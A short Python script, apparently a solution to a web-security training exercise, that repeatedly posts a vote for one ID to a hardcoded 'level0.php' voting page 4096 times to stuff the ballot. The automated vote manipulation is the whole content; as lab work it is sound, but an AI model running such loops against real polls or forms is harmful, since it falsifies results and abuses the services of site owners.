#!/usr/bin/python3
"""This module use request library"""


from bs4 import BeautifulSoup
import requests

URL = "http://158.69.76.135/level0.php"

with requests.session() as session:
    for i in range(4096):
        response = session.get(URL)
        soup = BeautifulSoup(response.content, "html.parser")
        title = soup.find_all("input")
        credentials = {"id": 3811, "holdthedoor": "submit"}
        vote = session.post(URL, data=credentials)
